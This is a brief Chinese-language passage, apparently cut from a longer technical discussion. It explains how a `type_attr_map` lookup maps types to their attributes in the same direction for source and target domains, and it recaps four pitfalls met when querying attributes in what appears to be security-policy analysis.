`type_attr_map[x]` 的语义是「x 挂在哪些属性上」，**源和目标两个方向用的是同一张表、同一个方向**。

至此属性查询踩坑全记录：① type 别名折叠（名字）→ ② 源域属性 → ③ 目标域属性 → ④ 展开方向。四合一的最终形态就是上面两行。
